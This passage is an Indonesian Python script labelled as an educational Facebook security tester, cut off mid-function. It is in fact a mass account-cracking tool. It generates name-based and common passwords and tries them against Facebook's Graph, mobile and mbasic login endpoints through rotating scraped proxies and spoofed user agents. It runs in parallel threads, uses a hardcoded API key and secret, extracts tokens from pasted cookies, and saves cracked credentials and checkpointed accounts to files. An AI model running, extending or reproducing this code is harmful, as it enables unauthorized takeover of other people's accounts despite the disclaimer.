#!/usr/bin/env python3
"""
SISTEM PENGUJIAN KEAMANAN FACEBOOK - EDUKASI
Hanya untuk tujuan edukasi dan pengujian sistem sendiri
Penulis: Team Keamanan Siber
"""

# =================== IMPORT & KONFIGURASI ====================
import os
import sys
import json
import re
import time
import random
import datetime
import calendar
import hashlib
import base64
import uuid
import shutil
import subprocess
from time import sleep
from datetime import date
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import List, Dict, Tuple, Optional, Any
from dataclasses import dataclass, field
from enum import Enum

# Third-party imports dengan error handling
try:
    import requests
    from bs4 import BeautifulSoup
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    
    from rich.console import Console
    from rich.panel import Panel
    from rich.table import Table
    from rich.tree import Tree
    from rich.columns import Columns
    from rich.align import Align
    from rich.progress import (
        Progress, SpinnerColumn, BarColumn, 
        TextColumn, TimeElapsedColumn, TimeRemainingColumn
    )
    from rich.layout import Layout
    from rich.text import Text
    from rich import print as rprint
    from rich import box
    from rich.syntax import Syntax
    from rich.prompt import Prompt, Confirm
    from rich.rule import Rule
    from rich.markdown import Markdown
    from rich.live import Live
    from rich import pretty
    pretty.install()
    
except ImportError as e:
    print(f"[ERROR] Modul tidak ditemukan: {e}")
    print("Instal dengan: pip install requests beautifulsoup4 rich")
    sys.exit(1)

# =================== KONSTANTA & KONFIGURASI ====================
@dataclass
class Colors:
    """Konfigurasi warna untuk UI"""
    RED = "#FF0000"
    GREEN = "#00FF00"
    YELLOW = "#FFFF00"
    BLUE = "#00C8FF"
    WHITE = "#FFFFFF"
    PURPLE = "#AF00FF"
    ORANGE = "#FF8F00"
    CYAN = "#00FFFF"
    MAGENTA = "#FF00FF"
    
    @property
    def rich_red(self):
        return "[red]"
    
    @property
    def rich_green(self):
        return "[green]"
    
    @property
    def rich_yellow(self):
        return "[yellow]"
    
    @property
    def rich_blue(self):
        return "[blue]"
    
    @property
    def rich_white(self):
        return "[white]"

class FilePaths:
    """Konfigurasi path file"""
    TOKEN_FILE = ".token.txt"
    COOKIE_FILE = ".cookie.txt"
    PROXY_FILE = ".proxy.txt"
    USER_AGENT_FILE = "user_agents.txt"
    CONFIG_FILE = "config.json"
    LOG_FILE = "security_test.log"
    RESULTS_DIR = "results"
    OK_DIR = "OK"
    CP_DIR = "CP"
    
    @classmethod
    def init_directories(cls):
        """Inisialisasi direktori yang diperlukan"""
        dirs = [cls.RESULTS_DIR, cls.OK_DIR, cls.CP_DIR]
        for dir_path in dirs:
            os.makedirs(dir_path, exist_ok=True)

class APIConfig:
    """Konfigurasi API (digunakan hanya untuk edukasi)"""
    API_KEY = '882a8490361da98702bf97a021ddc14d'
    API_SECRET = '62f8ce9f74b12f84c123cc23437a4a32'
    GRAPH_API_VERSION = "v15.0"
    
    @staticmethod
    def generate_signature(params: Dict) -> str:
        """Generate signature untuk API request"""
        sorted_params = sorted(params.items())
        param_string = ''.join([f"{k}={v}" for k, v in sorted_params])
        param_string += APIConfig.API_SECRET
        return hashlib.md5(param_string.encode()).hexdigest()

class SecurityHeaders:
    """Headers untuk request dengan keamanan"""
    @staticmethod
    def get_default():
        return {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }

# =================== LOGGING SYSTEM ====================
class Logger:
    """Sistem logging untuk audit trail"""
    
    def __init__(self, log_file: str = FilePaths.LOG_FILE):
        self.log_file = log_file
        self.console = Console()
        
    def log(self, message: str, level: str = "INFO"):
        """Log message dengan timestamp"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}] [{level}] {message}"
        
        # Tulis ke file
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write(log_entry + '\n')
        
        # Tampilkan ke console dengan warna
        color_map = {
            "INFO": "cyan",
            "WARNING": "yellow",
            "ERROR": "red",
            "SUCCESS": "green",
            "DEBUG": "white"
        }
        
        self.console.print(f"[{color_map.get(level, 'white')}]{log_entry}[/]")
    
    def info(self, message: str):
        self.log(message, "INFO")
    
    def warning(self, message: str):
        self.log(message, "WARNING")
    
    def error(self, message: str):
        self.log(message, "ERROR")
    
    def success(self, message: str):
        self.log(message, "SUCCESS")

# =================== USER AGENT MANAGER ====================
class UserAgentManager:
    """Manager untuk handle user agents"""
    
    def __init__(self):
        self.agents: List[str] = []
        self.load_agents()
    
    def load_agents(self):
        """Load user agents dari file atau generate"""
        try:
            if os.path.exists(FilePaths.USER_AGENT_FILE):
                with open(FilePaths.USER_AGENT_FILE, 'r', encoding='utf-8') as f:
                    self.agents = [line.strip() for line in f if line.strip()]
            else:
                self.generate_agents()
                self.save_agents()
        except Exception as e:
            self.generate_agents()
    
    def generate_agents(self, count: int = 50):
        """Generate random user agents"""
        templates = [
            # Android devices
            "Mozilla/5.0 (Linux; Android {version}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android {version}; {model} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} Mobile Safari/537.36",
            
            # iOS devices
            "Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) AppleWebKit/{webkit_version} (KHTML, like Gecko) Version/{safari_version} Mobile/{safari_build} Safari/{webkit_version}",
            
            # Desktop browsers
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} Safari/537.36",
        ]
        
        android_versions = ["10", "11", "12", "13"]
        ios_versions = ["14_0", "15_0", "16_0"]
        models = ["SM-G991B", "iPhone13,2", "iPad11,6", "PC"]
        chrome_versions = [f"1{random.randint(10, 20)}.0.{random.randint(1000, 9999)}.{random.randint(100, 999)}" for _ in range(10)]
        
        for _ in range(count):
            template = random.choice(templates)
            agent = template.format(
                version=random.choice(android_versions),
                model=random.choice(models),
                chrome_version=random.choice(chrome_versions),
                ios_version=random.choice(ios_versions),
                webkit_version=f"60{random.randint(0, 9)}.{random.randint(1, 9)}",
                safari_version=f"15.{random.randint(0, 9)}",
                safari_build=f"15E{random.randint(100, 999)}",
                build=f"RP1A.{random.randint(200000, 210000)}.{random.randint(1, 999)}"
            )
            self.agents.append(agent)
    
    def save_agents(self):
        """Save agents ke file"""
        with open(FilePaths.USER_AGENT_FILE, 'w', encoding='utf-8') as f:
            for agent in self.agents:
                f.write(agent + '\n')
    
    def get_random(self) -> str:
        """Get random user agent"""
        return random.choice(self.agents) if self.agents else SecurityHeaders.get_default()['User-Agent']
    
    def get_batch(self, count: int = 10) -> List[str]:
        """Get batch of random agents"""
        return random.sample(self.agents, min(count, len(self.agents)))

# =================== PROXY MANAGER ====================
class ProxyManager:
    """Manager untuk handle proxies"""
    
    def __init__(self):
        self.proxies: List[str] = []
        self.current_index = 0
        self.load_proxies()
    
    def load_proxies(self):
        """Load proxies dari berbagai sumber"""
        sources = [
            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=10000&country=all",
            "https://www.proxy-list.download/api/v1/get?type=socks4",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt"
        ]
        
        all_proxies = set()
        
        for source in sources:
            try:
                response = requests.get(source, timeout=10)
                if response.status_code == 200:
                    proxies = [p.strip() for p in response.text.split('\n') if p.strip()]
                    all_proxies.update(proxies)
            except:
                continue
        
        self.proxies = list(all_proxies)
        
        # Save ke file
        if self.proxies:
            with open(FilePaths.PROXY_FILE, 'w', encoding='utf-8') as f:
                f.write('\n'.join(self.proxies))
    
    def get_proxy(self) -> Optional[Dict]:
        """Get next proxy dengan round-robin"""
        if not self.proxies:
            return None
        
        proxy = self.proxies[self.current_index]
        self.current_index = (self.current_index + 1) % len(self.proxies)
        
        return {
            'http': f'socks4://{proxy}',
            'https': f'socks4://{proxy}'
        }
    
    def get_random_proxy(self) -> Optional[Dict]:
        """Get random proxy"""
        if not self.proxies:
            return None
        
        proxy = random.choice(self.proxies)
        return {
            'http': f'socks4://{proxy}',
            'https': f'socks4://{proxy}'
        }

# =================== AUTHENTICATION SYSTEM ====================
class Authentication:
    """Sistem autentikasi untuk testing"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.session = requests.Session()
        self.console = Console()
        self.token = None
        self.cookies = None
        self.user_id = None
        self.user_name = None
    
    def load_credentials(self) -> bool:
        """Load credentials dari file"""
        try:
            if os.path.exists(FilePaths.TOKEN_FILE):
                with open(FilePaths.TOKEN_FILE, 'r') as f:
                    self.token = f.read().strip()
            
            if os.path.exists(FilePaths.COOKIE_FILE):
                with open(FilePaths.COOKIE_FILE, 'r') as f:
                    self.cookies = {'cookie': f.read().strip()}
            
            return bool(self.token and self.cookies)
        except:
            return False
    
    def save_credentials(self):
        """Save credentials ke file"""
        try:
            if self.token:
                with open(FilePaths.TOKEN_FILE, 'w') as f:
                    f.write(self.token)
            
            if self.cookies:
                with open(FilePaths.COOKIE_FILE, 'w') as f:
                    f.write(self.cookies.get('cookie', ''))
        except Exception as e:
            self.logger.error(f"Gagal menyimpan credentials: {e}")
    
    def clear_credentials(self):
        """Hapus credentials"""
        for file_path in [FilePaths.TOKEN_FILE, FilePaths.COOKIE_FILE]:
            if os.path.exists(file_path):
                os.remove(file_path)
        
        self.token = None
        self.cookies = None
        self.user_id = None
        self.user_name = None
    
    def validate_session(self) -> bool:
        """Validasi session/token"""
        if not self.token:
            return False
        
        try:
            url = f"https://graph.facebook.com/me?access_token={self.token}&fields=id,name"
            response = self.session.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                self.user_id = data.get('id')
                self.user_name = data.get('name')
                return True
            return False
        except:
            return False
    
    def login_with_cookie(self) -> bool:
        """Login menggunakan cookie"""
        self.console.print("\n[bold cyan]=== LOGIN DENGAN COOKIE ===[/bold cyan]")
        
        cookie_input = Prompt.ask("Masukkan cookie Facebook", password=False)
        
        if not cookie_input:
            self.logger.error("Cookie tidak boleh kosong")
            return False
        
        try:
            # Parse cookie
            cookie_dict = {}
            for item in cookie_input.split(';'):
                item = item.strip()
                if '=' in item:
                    key, value = item.split('=', 1)
                    cookie_dict[key.strip()] = value.strip()
            
            self.cookies = {'cookie': cookie_input}
            self.session.cookies.update(cookie_dict)
            
            # Coba dapatkan token
            token = self.extract_token_from_cookie()
            if token:
                self.token = token
                self.save_credentials()
                
                if self.validate_session():
                    self.logger.success(f"Login berhasil sebagai: {self.user_name}")
                    return True
            
            self.logger.error("Login gagal. Cookie tidak valid.")
            return False
            
        except Exception as e:
            self.logger.error(f"Error login: {e}")
            return False
    
    def extract_token_from_cookie(self) -> Optional[str]:
        """Extract token dari cookie menggunakan berbagai metode"""
        methods = [
            self._extract_from_ads_manager,
            self._extract_from_graph_api,
            self._extract_from_basic
        ]
        
        for method in methods:
            try:
                token = method()
                if token and len(token) > 100:  # Token biasanya panjang
                    return token
            except:
                continue
        
        return None
    
    def _extract_from_ads_manager(self) -> Optional[str]:
        """Extract token dari Facebook Ads Manager"""
        try:
            url = "https://www.facebook.com/adsmanager/manage/campaigns"
            response = self.session.get(url, timeout=10)
            
            # Cari act parameter
            match = re.search(r'act=(\d+)', response.text)
            if match:
                act_id = match.group(1)
                url_with_act = f"{url}?act={act_id}"
                response2 = self.session.get(url_with_act, timeout=10)
                
                # Cari token EAAB
                token_match = re.search(r'EAAB[a-zA-Z0-9]{100,}', response2.text)
                if token_match:
                    return token_match.group(0)
        except:
            pass
        
        return None
    
    def _extract_from_graph_api(self) -> Optional[str]:
        """Extract token dari Graph API"""
        try:
            # Coba akses me endpoint
            url = "https://graph.facebook.com/me"
            response = self.session.get(url, timeout=10)
            
            # Cari token di response
            if response.status_code == 200:
                # Coba parsing sebagai JSON
                data = response.json()
                if 'access_token' in data:
                    return data['access_token']
        except:
            pass
        
        return None
    
    def _extract_from_basic(self) -> Optional[str]:
        """Extract token dari mbasic.facebook.com"""
        try:
            url = "https://mbasic.facebook.com/home.php"
            response = self.session.get(url, timeout=10)
            
            # Cari token di form
            soup = BeautifulSoup(response.text, 'html.parser')
            token_input = soup.find('input', {'name': 'fb_dtsg'})
            
            if token_input:
                return token_input.get('value')
        except:
            pass
        
        return None

# =================== PASSWORD GENERATOR ====================
class PasswordGenerator:
    """Generator password untuk testing"""
    
    @staticmethod
    def generate_from_name(name: str) -> List[str]:
        """Generate password variations dari nama"""
        name = name.lower().strip()
        parts = name.split()
        
        if not parts:
            return []
        
        first_name = parts[0]
        passwords = set()
        
        # Basic variations
        passwords.add(first_name)
        passwords.add(first_name + "123")
        passwords.add(first_name + "1234")
        passwords.add(first_name + "12345")
        passwords.add(first_name + "123456")
        passwords.add(first_name + "@123")
        passwords.add(first_name + "!@#")
        
        # Year variations
        current_year = datetime.datetime.now().year
        for year in range(current_year - 10, current_year + 1):
            passwords.add(first_name + str(year))
            passwords.add(str(year) + first_name)
        
        # Common password patterns
        common_passwords = [
            "password", "123456", "12345678", "1234", "qwerty",
            "12345", "dragon", "baseball", "football", "monkey",
            "letmein", "mustang", "michael", "shadow", "master",
            "jennifer", "jordan", "superman", "harley", "fuckyou"
        ]
        
        passwords.update(common_passwords)
        
        # Jika ada nama lengkap
        if len(parts) > 1:
            last_name = parts[-1]
            passwords.add(last_name)
            passwords.add(first_name + last_name)
            passwords.add(first_name + "." + last_name)
            passwords.add(first_name[0] + last_name)
        
        return list(passwords)[:50]  # Batasi jumlah password

# =================== SECURITY TEST ENGINE ====================
class SecurityTestEngine:
    """Engine utama untuk testing keamanan"""
    
    def __init__(self, logger: Logger, auth: Authentication):
        self.logger = logger
        self.auth = auth
        self.console = Console()
        self.ua_manager = UserAgentManager()
        self.proxy_manager = ProxyManager()
        self.session = requests.Session()
        
        # Stats
        self.stats = {
            'total_tested': 0,
            'successful': 0,
            'failed': 0,
            'checkpoint': 0,
            'start_time': None,
            'end_time': None
        }
    
    def test_single_account(self, account_id: str, name: str, method: str = "graph") -> Dict:
        """Test single account dengan berbagai metode"""
        self.stats['total_tested'] += 1
        
        passwords = PasswordGenerator.generate_from_name(name)
        result = {
            'account_id': account_id,
            'name': name,
            'status': 'failed',
            'method': method,
            'password': None,
            'error': None,
            'timestamp': datetime.datetime.now().isoformat()
        }
        
        for password in passwords:
            try:
                if method == "graph":
                    success = self._test_graph_api(account_id, password)
                elif method == "mobile":
                    success = self._test_mobile_api(account_id, password)
                else:
                    success = self._test_basic(account_id, password)
                
                if success:
                    result['status'] = 'success'
                    result['password'] = password
                    self.stats['successful'] += 1
                    self.logger.success(f"SUCCESS: {account_id} - {password}")
                    break
                    
            except Exception as e:
                error_msg = str(e)
                result['error'] = error_msg
                
                if "checkpoint" in error_msg.lower() or "verify" in error_msg.lower():
                    result['status'] = 'checkpoint'
                    self.stats['checkpoint'] += 1
                    self.logger.warning(f"CHECKPOINT: {account_id}")
                    break
        
        if result['status'] == 'failed':
            self.stats['failed'] += 1
        
        return result
    
    def _test_graph_api(self, account_id: str, password: str) -> bool:
        """Test menggunakan Graph API"""
        try:
            headers = {
                'User-Agent': self.ua_manager.get_random(),
                'Authorization': f'OAuth {APIConfig.API_KEY}',
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            data = {
                'access_token': APIConfig.API_KEY,
                'email': account_id,
                'password': password,
                'method': 'auth.login',
                'format': 'json',
                'generate_session_cookies': '1'
            }
            
            data['sig'] = APIConfig.generate_signature(data)
            
            proxy = self.proxy_manager.get_random_proxy()
            response = self.session.post(
                "https://graph.facebook.com/auth/login",
                data=data,
                headers=headers,
                proxies=proxy,
                timeout=30,
                verify=False
            )
            
            if response.status_code == 200:
                result = response.json()
                return 'access_token' in result
                
        except requests.exceptions.ConnectionError:
            time.sleep(5)  # Jeda jika ada masalah koneksi
        except Exception as e:
            if "checkpoint" in str(e).lower():
                raise Exception("Account checkpoint detected")
        
        return False
    
    def _test_mobile_api(self, account_id: str, password: str) -> bool:
        """Test menggunakan Mobile API"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-FB-Connection-Bandwidth': '10485760',
                'X-FB-Net-HNI': str(random.randint(50000, 60000)),
                'X-FB-Sim-HNI': str(random.randint(50000, 60000)),
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': account_id,
                'password': f'#PWD_FB4A:0:{int(time.time())}:{password}',
                'cpl': 'true',
                'credentials_type': 'password',
                'generate_session_cookies': '1',
                'generate_analytics_claim': '1',
                'source': 'login',
                'machine_id': str(uuid.uuid4()),
                'meta_inf_fbmeta': 'NO_FILE',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'id_ID',
                'client_country_code': 'ID',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': APIConfig.API_KEY,
                'access_token': f'{APIConfig.API_KEY}|{APIConfig.API_SECRET}'
            }
            
            proxy = self.proxy_manager.get_random_proxy()
            response = self.session.post(
                "https://b-api.facebook.com/method/auth.login",
                data=data,
                headers=headers,
                proxies=proxy,
                timeout=30
            )
            
            if response.status_code == 200:
                result = response.json()
                return 'session_key' in result or 'access_token' in result
                
        except Exception as e:
            if "User must verify" in str(e):
                raise Exception("Account checkpoint detected")
        
        return False
    
    def _test_basic(self, account_id: str, password: str) -> bool:
        """Test menggunakan basic login"""
        try:
            headers = {
                'User-Agent': self.ua_manager.get_random(),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://mbasic.facebook.com',
                'Connection': 'keep-alive',
                'Referer': 'https://mbasic.facebook.com/',
                'Upgrade-Insecure-Requests': '1'
            }
            
            # Get login page first
            session = requests.Session()
            proxy = self.proxy_manager.get_random_proxy()
            
            response = session.get(
                "https://mbasic.facebook.com/login.php",
                headers=headers,
                proxies=proxy,
                timeout=30
            )
            
            # Parse untuk mendapatkan fb_dtsg
            soup = BeautifulSoup(response.text, 'html.parser')
            fb_dtsg = soup.find('input', {'name': 'fb_dtsg'})
            
            if not fb_dtsg:
                return False
            
            fb_dtsg_value = fb_dtsg.get('value', '')
            
            # Submit login
            login_data = {
                'fb_dtsg': fb_dtsg_value,
                'jazoest': '2657',  # Default value
                'email': account_id,
                'pass': password,
                'login': 'Log In'
            }
            
            response = session.post(
                "https://mbasic.facebook.com/login/device-based/regular/login/",
                data=login_data,
                headers=headers,
                proxies=proxy,
                timeout=30,
                allow_redirects=True
            )
            
            # Check jika login berhasil
            if "home" in response.url or "checkpoint" not in response.text:
                return "mbasic_logout_button" in response.text
            
        except Exception as e:
            pass
        
        return False
    
    def run_batch_test(self, accounts: List[Tuple[str, str]], max_workers: int = 10) -> List[Dict]:
        """Run batch testing dengan multi-threading"""
        self.stats['start_time'] = datetime.datetime.now()
        
        results = []
        
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            BarColumn(),
            TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
            TimeElapsedColumn(),
            TimeRemainingColumn(),
            console=self.console
        ) as progress:
            
            task = progress.add_task("[cyan]Testing accounts...", total=len(accounts))
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {
                    executor.submit(self.test_single_account, acc_id, name): (acc_id, name)
                    for acc_id, name in accounts
                }
                
                for future in as_completed(futures):
                    try:
                        result = future.result(timeout=300)
                        results.append(result)
                        progress.update(task, advance=1)
                        
                        # Update display
                        progress.refresh()
                        
                    except Exception as e:
                        acc_id, name = futures[future]
                        self.logger.error(f"Error testing {acc_id}: {e}")
                        progress.update(task, advance=1)
        
        self.stats['end_time'] = datetime.datetime.now()
        return results
    
    def save_results(self, results: List[Dict]):
        """Save results ke file"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        
        # Filter results
        success_results = [r for r in results if r['status'] == 'success']
        checkpoint_results = [r for r in results if r['status'] == 'checkpoint']
        failed_results = [r for r in results if r['status'] == 'failed']
        
        # Save successful
        if success_results:
            success_file = os.path.join(FilePaths.OK_DIR, f"success_{timestamp}.json")
            with open(success_file, 'w', encoding='utf-8') as f:
                json.dump(success_results, f, indent=2, ensure_ascii=False)
            
            # Juga save dalam format text
            success_txt = os.path.join(FilePaths.OK_DIR, f"success_{timestamp}.txt")
            with open(success_txt, 'w', encoding='utf-8') as f:
                for result in success_results:
                    f.write(f"{result['account_id']}|{result['password']}|{result.get('method', 'unknown')}\n")
        
        # Save checkpoint
        if checkpoint_results:
            cp_file = os.path.join(FilePaths.CP_DIR, f"checkpoint_{timestamp}.json")
            with open(cp_file, 'w', encoding='utf-8') as f:
                json.dump(checkpoint_results, f, indent=2, ensure_ascii=False)
        
        # Save stats
        stats_file = os.path.join(FilePaths.RESULTS_DIR, f"stats_{timestamp}.json")
        with open(stats_file, 'w', encoding='utf-8') as f:
            json.dump(self.stats, f, indent=2, default=str)
        
        return len(success_results), len(checkpoint_results), len(failed_results)

# =================== UI COMPONENTS ====================
class UserInterface:
    """User Interface menggunakan Rich"""
    
    def __init__(self):
        self.console = Console()
        self.colors = Colors()
        self.layout = Layout()
    
    def show_welcome(self):
        """Tampilkan welcome banner"""
        welcome_text = """
╔══════════════════════════════════════════════════════════╗
║            SISTEM PENGUJIAN KEAMANAN FACEBOOK            ║
║                    [EDUCATIONAL PURPOSE]                 ║
╚══════════════════════════════════════════════════════════╝
        
[bold cyan]DISCLAIMER:[/bold cyan]
• Alat ini hanya untuk tujuan edukasi dan pengujian sistem sendiri
• Akses tidak sah ke akun orang lain adalah tindakan ilegal
• Pengguna bertanggung jawab penuh atas penggunaan alat ini
• Selalu patuhi hukum dan etika cybersecurity
        """
        
        self.console.print(Panel(
            welcome_text,
            title="[bold red]PERINGATAN HUKUM[/bold red]",
            border_style="red",
            padding=(1, 2)
        ))
        
        if not Confirm.ask("[yellow]Apakah Anda memahami dan menyetujui ketentuan di atas?[/yellow]", default=False):
            self.console.print("[green]Program dihentikan. Terima kasih telah beretika.[/green]")
            sys.exit(0)
    
    def show_main_menu(self) -> str:
        """Tampilkan main menu"""
        menu_options = """
[bold cyan]1.[/bold cyan] Login dengan Cookie
[bold cyan]2.[/bold cyan] Testing Keamanan Akun
[bold cyan]3.[/bold cyan] Generate User Agents
[bold cyan]4.[/bold cyan] Update Proxy List
[bold cyan]5.[/bold cyan] Lihat Hasil Testing
[bold cyan]6.[/bold cyan] Hapus Session
[bold cyan]7.[/bold cyan] Exit
        """
        
        self.console.print(Panel(
            menu_options,
            title="[bold green]MENU UTAMA[/bold green]",
            border_style="green",
            padding=(1, 2)
        ))
        
        choice = Prompt.ask(
            "[bold yellow]Pilih menu[/bold yellow]",
            choices=["1", "2", "3", "4", "5", "6", "7"],
            default="1"
        )
        
        return choice
    
    def show_testing_menu(self) -> Dict:
        """Tampilkan menu testing"""
        self.console.print(Panel(
            "[bold cyan]METODE TESTING KEAMANAN[/bold cyan]",
            border_style="blue"
        ))
        
        options = {
            'method': Prompt.ask(
                "[yellow]Metode testing[/yellow]",
                choices=["graph", "mobile", "basic"],
                default="graph"
            ),
            'workers': int(Prompt.ask(
                "[yellow]Jumlah workers[/yellow]",
                default="10"
            )),
            'input_type': Prompt.ask(
                "[yellow]Input data[/yellow]",
                choices=["file", "manual", "friend_list"],
                default="file"
            )
        }
        
        return options
    
    def show_results_table(self, results: List[Dict]):
        """Tampilkan results dalam tabel"""
        table = Table(title="[bold green]HASIL TESTING[/bold green]", box=box.ROUNDED)
        
        table.add_column("No.", style="cyan", width=5)
        table.add_column("Account ID", style="white", width=20)
        table.add_column("Status", style="magenta", width=15)
        table.add_column("Password", style="yellow", width=20)
        table.add_column("Method", style="blue", width=10)
        
        for idx, result in enumerate(results[:50], 1):  # Limit to 50 rows
            status_color = {
                'success': 'green',
                'checkpoint': 'yellow',
                'failed': 'red'
            }.get(result['status'], 'white')
            
            table.add_row(
                str(idx),
                result['account_id'][:20],
                f"[{status_color}]{result['status'].upper()}[/{status_color}]",
                result.get('password', 'N/A'),
                result.get('method', 'N/A')
            )
        
        self.console.print(table)
    
    def show_stats(self, stats: Dict, success: int, checkpoint: int, failed: int):
        """Tampilkan statistics"""
        duration = None
        if stats.get('start_time') and stats.get('end_time'):
            if isinstance(stats['start_time'], str):
                start = datetime.datetime.fromisoformat(stats['start_time'])
                end = datetime.datetime.fromisoformat(stats['end_time'])
            else:
                start = stats['start_time']
                end = stats['end_time']
            duration = end - start
        
        stats_panel = Panel(
            f"""
[bold cyan]TOTAL TESTED:[/bold cyan] {stats.get('total_tested', 0)}
[bold green]SUCCESSFUL:[/bold green] {success}
[bold yellow]CHECKPOINT:[/bold yellow] {checkpoint}
[bold red]FAILED:[/bold red] {failed}
[bold blue]DURATION:[/bold blue] {duration}
            """,
            title="[bold magenta]STATISTIK[/bold magenta]",
            border_style="cyan"
        )
        
        self.console.print(stats_panel)

# =================== MAIN APPLICATION ====================
class SecurityTestingApp:
    """Aplikasi utama untuk testing keamanan"""
    
    def __init__(self):
        # Inisialisasi sistem
        FilePaths.init_directories()
        
        # Setup komponen
        self.logger = Logger()
        self.ui = UserInterface()
        self.auth = Authentication(self.logger)
        self.engine = SecurityTestEngine(self.logger, self.auth)
        
        # State aplikasi
        self.is_authenticated = False
        self.current_accounts = []
    
    def run(self):
        """Jalankan aplikasi utama"""
        try:
            # Tampilkan welcome
            self.ui.show_welcome()
            
            # Main loop
            while True:
                # Cek autentikasi
                if not self.is_authenticated:
                    self.handle_authentication()
                
                # Tampilkan menu utama
                choice = self.ui.show_main_menu()
                
                if choice == "1":  # Login
                    self.handle_authentication()
                
                elif choice == "2":  # Testing
                    if self.is_authenticated:
                        self.handle_testing()
                    else:
                        self.logger.warning("Silakan login terlebih dahulu")
                
                elif choice == "3":  # Generate UA
                    self.generate_user_agents()
                
                elif choice == "4":  # Update proxies
                    self.update_proxies()
                
                elif choice == "5":  # View results
                    self.view_results()
                
                elif choice == "6":  # Clear session
                    self.clear_session()
                
                elif choice == "7":  # Exit
                    self.shutdown()
                    break
                
        except KeyboardInterrupt:
            self.logger.info("Program dihentikan oleh pengguna")
            self.shutdown()
        except Exception as e:
            self.logger.error(f"Error: {e}")
            self.shutdown()
    
    def handle_authentication(self):
        """Handle proses autentikasi"""
        try:
            # Coba load dari file
            if self.auth.load_credentials() and self.auth.validate_session():
                self.is_authenticated = True
                self.logger.success(f"Login berhasil sebagai: {self.auth.user_name}")
                return
            
            # Jika tidak ada credentials, minta login
            self.ui.console.print("\n[bold yellow]=== LOGIN DIPERLUKAN ===[/bold yellow]")
            
            if self.auth.login_with_cookie():
                self.is_authenticated = True
            else:
                self.logger.error("Login gagal")
                self.is_authenticated = False
                
        except Exception as e:
            self.logger.error(f"Authentication error: {e}")
            self.is_authenticated = False
    
    def handle_testing(self):
        """Handle proses testing"""
        try:
            # Tampilkan menu testing
            options = self.ui.show_testing_menu()
            
            # Dapatkan accounts untuk testing
            accounts = self.get_test_accounts(options['input_type'])
            
            if not accounts:
                self.logger.warning("Tidak ada accounts untuk testing")
                return
            
            # Konfirmasi testing
            self.ui.console.print(f"\n[bold cyan]Akan melakukan testing pada {len(accounts)} accounts[/bold cyan]")
            
            if not Confirm.ask("[yellow]Lanjutkan testing?[/yellow]", default=False):
                return
            
            # Jalankan testing
            self.logger.info(f"Memulai testing dengan {options['workers']} workers...")
            
            results = self.engine.run_batch_test(
                accounts=accounts,
                max_workers=options['workers']
            )
            
            # Save dan tampilkan results
            success, checkpoint, failed = self.engine.save_results(results)
            
            # Tampilkan summary
            self.ui.show_stats(self.engine.stats, success, checkpoint, failed)
            
            # Tampilkan table results
            self.ui.show_results_table(results[:20])  # Tampilkan 20 pertama
            
            # Reset stats untuk next run
            self.engine.stats = {
                'total_tested': 0,
                'successful': 0,
                'failed': 0,
                'checkpoint': 0,
                'start_time': None,
                'end_time': None
            }
            
        except Exception as e:
            self.logger.error(f"Testing error: {e}")
    
    def get_test_accounts(self, input_type: str) -> List[Tuple[str, str]]:
        """Dapatkan accounts untuk testing berdasarkan input type"""
        accounts = []
        
        if input_type == "file":
            # Baca dari file
            file_path = Prompt.ask("[yellow]Masukkan path file[/yellow]", default="accounts.txt")
            
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if '|' in line:
                            acc_id, name = line.split('|', 1)
                            accounts.append((acc_id.strip(), name.strip()))
            except Exception as e:
                self.logger.error(f"Error membaca file: {e}")
        
        elif input_type == "manual":
            # Input manual
            self.ui.console.print("[cyan]Masukkan accounts (format: id|name)[/cyan]")
            self.ui.console.print("[yellow]Ketik 'done' untuk selesai[/yellow]")
            
            while True:
                entry = Prompt.ask("[white]Account")
                if entry.lower() == 'done':
                    break
                
                if '|' in entry:
                    acc_id, name = entry.split('|', 1)
